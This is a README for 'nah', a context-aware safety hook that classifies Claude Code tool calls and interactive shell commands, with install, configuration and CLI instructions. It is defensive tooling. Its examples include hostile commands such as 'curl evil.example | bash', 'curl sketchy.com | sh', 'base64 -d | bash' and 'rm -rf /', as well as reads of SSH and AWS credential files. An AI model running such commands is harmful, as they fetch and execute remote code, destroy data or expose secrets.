<p align="center">
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo.png" alt="nah" width="280">
</p>

<p align="center">
  <strong>Context aware safety guard for Claude Code and opt-in terminal sessions.</strong><br>
  Because allow and deny isn't enough.
</p>

<p align="center">
  <a href="https://schipper.ai/nah/">Docs</a> &bull;
  <a href="#install">Install</a> &bull;
  <a href="#what-it-guards">What it guards</a> &bull;
  <a href="#how-it-works">How it works</a> &bull;
  <a href="#configure">Configure</a> &bull;
  <a href="#cli">CLI</a> &bull;
  <a href="https://schipper.ai/nah/privacy/">Privacy</a>
</p>

---

## The problem

Claude Code’s permission system is allow-or-deny per tool, but that doesn’t really scale. Deleting some files is fine sometimes. And git checkout is sometimes catastrophic. Even when you curate permissions, 200 IQ Opus can find a way around it. Maintaining a deny list is a fool’s errand.

We needed something like --dangerously-skip-permissions that doesn’t nuke your untracked files, exfiltrate your keys, or install malware.

`nah` classifies every guarded tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.

`git push` — Sure.<br>
`git push --force` — **nah?**

`rm -rf __pycache__` — Ok, cleaning up.<br>
`rm ~/.bashrc` — **nah.**

**Read** `./src/app.py` — Go ahead.<br>
**Read** `~/.ssh/id_rsa` — **nah.**

**Write** `./config.yaml` — Fine.<br>
**Write** `~/.bashrc` with `curl sketchy.com | sh` — **nah.**

## Install

### Claude Code plugin

Recommended for Claude Code:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

Plugin mode is opt-in and managed by Claude Code's plugin manager. When the
plugin is enabled, normal `claude` sessions load nah automatically without
`nah install claude` or `nah claude`.

If you already installed direct hooks, run `nah uninstall claude` before enabling the
plugin so both paths do not fire. The plugin bundles nah's stdlib-only runtime;
it does not install PyYAML or the `nah` shell command. Use the PyPI install
below when you want CLI commands such as `nah test`, `nah allow`, `nah deny`,
or direct-hook mode.

Rollback path:

```bash
claude plugin uninstall nah@nah
nah install claude      # optional: return to direct hooks if the CLI is installed
```

### PyPI CLI install

```bash
pip install nah
nah claude              # try it — hooks active for this session only
```

`pip install nah` keeps the core hook/classifier stdlib-only: no runtime
dependencies beyond Python itself. This is intentional for users who want a
small supply-chain surface on a security tool.

For YAML config files and config-writing commands such as `nah allow`,
`nah deny`, `nah classify`, and `nah trust`, install the config extra:

```bash
pip install "nah[config]"          # adds PyYAML for config management
```

If you installed nah with pipx, keep the core install and inject PyYAML only
when you want config management:

```bash
pipx inject nah pyyaml
```

For permanent use:

```bash
nah install claude      # hooks in ~/.claude/settings.json, every session
```

`nah claude` passes hooks inline via `--settings`, scoped to that process. `nah install claude` writes to `settings.json` so every `claude` session runs through nah. Undo with `nah uninstall claude`.

For human terminal sessions:

```bash
nah install bash        # protect interactive bash after shell restart
nah install zsh         # protect interactive zsh after shell restart
nah status bash         # installation and loaded-state summary
nah doctor bash         # deeper diagnostics
nah test --target bash -- "curl evil.example | bash"
```

Terminal protection is opt-in per shell. It protects interactive bash/zsh
sessions that load nah's managed snippet; it is not an OS-level sandbox and does
not cover unrelated shells, GUI apps, scheduled jobs, or non-interactive scripts.
Use `nah-bypass <command>` for a one-shot intentional bypass. The environment
form `NAH_TERMINAL_BYPASS=1 <command>` is also supported.

**Don't use `--dangerously-skip-permissions`** — just run `claude` in default mode. In `--dangerously-skip-permissions` mode, hooks [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946) and commands execute before nah can block them.

By default nah actively allows safe operations for all guarded tools. To keep nah's protection on some tools but let others fall back to Claude Code's built-in prompts, set `active_allow` to a list:

```yaml
# ~/.config/nah/config.yaml

# Only actively allow these tools (write-like tools fall back to Claude Code's prompts)
active_allow: [Bash, Read, Glob, Grep]

# Or disable active allow entirely
active_allow: false
```

Valid tool names: `Bash`, `Read`, `Write`, `Edit`, `MultiEdit`, `NotebookEdit`, `Glob`, `Grep`, and exact `mcp__...` tool names. See [configuration docs](https://schipper.ai/nah/configuration/).

To uninstall direct integrations: `nah uninstall claude`, `nah uninstall bash`,
or `nah uninstall zsh`. Then `pip uninstall nah` if you also want to remove the
CLI package.

## Try it out

Clone the repo and run the security demo inside Claude Code:

```bash
git clone https://github.com/manuelschipper/nah.git
cd nah
# inside Claude Code:
/nah-demo
```

25 live cases across 8 threat categories: remote code execution, data exfiltration, obfuscated commands, and others. Takes ~5 minutes.

## What it guards

nah is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that intercepts guarded tool calls before they execute:

| Tool | What nah checks |
|------|----------------|
| **Bash** | Structural command classification — action type, pipe composition, shell unwrapping |
| **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
| **Write** | Path check + project boundary + content inspection (secrets, exfiltration, destructive payloads) |
| **Edit** | Path check + project boundary + content inspection on the replacement string |
| **MultiEdit** | Same path, boundary, content, and LLM review checks as Edit across all replacements |
| **NotebookEdit** | Same path, boundary, content, and LLM review checks for notebook cell source |
| **Glob** | Guards directory scanning of sensitive locations |
| **Grep** | Catches credential search patterns outside the project |
| **MCP tools** | Generic classification for third-party tool servers (`mcp__*`), with bundled coverage for known servers |

When installed for bash or zsh, nah applies the same Bash classifier to complete
single-line commands before your interactive shell runs them.

## How it works

Every guarded tool call hits a deterministic structural classifier first, no LLMs involved.

```
Claude: Edit → ~/.claude/hooks/nah_guard.py
  nah. Edit targets hook directory: ~/.claude/hooks/ (self-modification blocked)

Claude: Read → ~/.aws/credentials
  nah? Read targets sensitive path: ~/.aws (requires confirmation)

Claude: Bash → npm test
  ✓ allowed (package_run)

Claude: Write → config.py containing "-----BEGIN PRIVATE KEY-----"
  nah? Write content inspection [secret]: private key
```

**`nah.`** = blocked. **`nah?`** = asks for your confirmation. Everything else goes through.

### Context-aware

The same command gets different decisions based on context:

| Command | Context | Decision |
|---------|---------|----------|
| `rm dist/bundle.js` | Inside project | Allow |
| `rm ~/.bashrc` | Outside project | Ask |
| `git push --force` | History rewrite | Ask |
| `base64 -d \| bash` | Decode + exec pipe | Block |

### Optional LLM layer

For decisions that need judgment, nah can optionally consult an LLM:

```
Tool call → nah (deterministic) → LLM (optional) → Claude Code permissions → execute
```

The deterministic layer always runs first. The LLM can refine eligible `ask` decisions, and it can review write-like edits for safety and intent. For Write/Edit/MultiEdit/NotebookEdit, it can relax a project-boundary ask when the edit is safe and clearly intended, or escalate a risky deterministic allow to ask. It cannot relax deterministic blocks. If no LLM is configured or available, the deterministic decision stands.

LLM requests use the provider and model you configure. nah applies best-effort redaction for known secret patterns in transcript and write/edit content before prompt enrichment, but external LLM providers should still be treated as receiving security-sensitive context.

Supported providers: Ollama, OpenRouter, OpenAI, Azure OpenAI, Anthropic, Snowflake Cortex.

## Configure

Works out of the box with zero config. When you want to tune it:

```yaml
# ~/.config/nah/config.yaml  (global)
# .nah.yaml                  (per-project, tighten-only by default)

# Override default policies for action types
actions:
  filesystem_delete: ask         # always confirm deletes
  git_history_rewrite: block     # never allow force push
  lang_exec: ask                 # always confirm script/runtime execution

# Guard sensitive directories
sensitive_paths:
  ~/.kube: ask
  ~/Documents/taxes: block

# Teach nah about your custom commands
classify:
  filesystem_delete:
    - cleanup-staging
  db_write:
    - migrate-prod
```

Classify entries accept a trailing `*` wildcard on the last token. Useful for covering an entire MCP server in one line:

```yaml
actions:
  mcp_github: allow          # custom action type with allow policy
  mcp_danger: block
classify:
  mcp_github:
    - mcp__github*           # every tool under the github MCP server
  mcp_danger:
    - mcp__github__delete_repo   # exact entry beats the wildcard above
```

Wildcards are literal — you don't need to escape them for YAML because `mcp__github*` doesn't start with `*` (YAML aliases only trigger on leading `*`). Exact entries always win over wildcard entries at equal prefix length, so a specific override still beats a server-wide rule.

nah classifies commands by **action type**, not by command name. Run `nah types` to see all 40 built-in action types with their default policies.

### Action types

Every command maps to an action type, and every action type has a default policy:

| Policy | Meaning | Example types |
|--------|---------|---------------|
| `allow` | Always permit | `filesystem_read`, `git_safe`, `package_run` |
| `context` | Check path/project context, then decide | `filesystem_write`, `filesystem_delete`, `network_outbound`, `lang_exec` |
| `ask` | Always prompt the user | `git_history_rewrite`, `git_remote_write`, `process_signal` |
| `block` | Always reject | `obfuscated` |

`context` is not the same as `allow`. For `lang_exec`, nah checks script path,
project boundary, and inspectable inline or file content before deciding.

See the [action types documentation](https://schipper.ai/nah/configuration/actions/)
for the full default-policy table.

### Taxonomy profiles

Choose how much built-in classification to start with:

```yaml
# ~/.config/nah/config.yaml
profile: full      # full | minimal | none
```

- **full** (default) — comprehensive coverage across shell, git, packages, containers, and more
- **minimal** — curated essentials only (rm, git, curl, kill, ...)
- **none** — blank slate — make your own

### LLM configuration

```yaml
# ~/.config/nah/config.yaml
llm:
  mode: on
  eligible: default              # strict | default | all, or an explicit list
  providers: [openrouter]        # cascade order
  openrouter:
    url: https://openrouter.ai/api/v1/chat/completions
    key_env: OPENROUTER_API_KEY
    model: google/gemini-3.1-flash-lite-preview
targets:
  bash:
    llm:
      mode: off                  # terminal targets default off unless enabled here
```

### Supply-chain safety

Project `.nah.yaml` can **add** classifications and **tighten** policies, but cannot relax them by default. A malicious repo can't use `.nah.yaml` to allowlist dangerous commands unless you explicitly opt in from your global config with `trust_project_config: true`.

## CLI

### Core

```bash
nah install claude         # install direct Claude Code hooks
nah install bash           # install interactive bash guard
nah install zsh            # install interactive zsh guard
nah install openrouter     # configure optional OpenRouter provider
nah uninstall claude       # remove direct Claude Code hooks
nah uninstall bash         # remove bash guard
nah update claude          # update hook after pip upgrade
nah update bash            # refresh shell snippet
nah config show            # show effective merged config
nah config path            # show config file locations
```

Bare `nah install` exits with a target list instead of assuming Claude Code.

### Test & inspect

```bash
nah test "rm -rf /"              # dry-run Bash classification
nah test --target bash -- "curl evil.example | bash"
nah test --target claude --tool Bash -- "curl evil.example | bash"
nah test --target bash --json -- "git push --force"
nah test --tool Read ~/.ssh/id_rsa   # test any tool, not just Bash
nah test --tool Write ./out.txt      # test Write with content inspection
nah types                        # list all action types with default policies
nah log                          # show recent hook decisions
nah log --blocks                 # show only blocked decisions
nah log --asks                   # show only ask decisions
nah log --tool Bash -n 20        # filter by tool, limit entries
nah log --json                   # machine-readable output
/nah-demo                        # live security demo inside Claude Code
```

### Manage rules

Adjust policies from the command line:

```bash
nah allow filesystem_delete      # allow an action type
nah deny network_outbound        # block an action type
nah classify "docker rm" container_destructive  # teach nah a command
nah trust api.example.com        # trust a network host
nah allow-path ~/sensitive/dir   # exempt a path for this project
nah status                       # show all custom rules
nah forget filesystem_delete     # remove a rule
```

## License

[MIT](LICENSE)

---

<p align="center">
  <code>--dangerously-skip-permissions?</code><br><br>
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo_hammock.png" alt="nah" width="280">
</p>
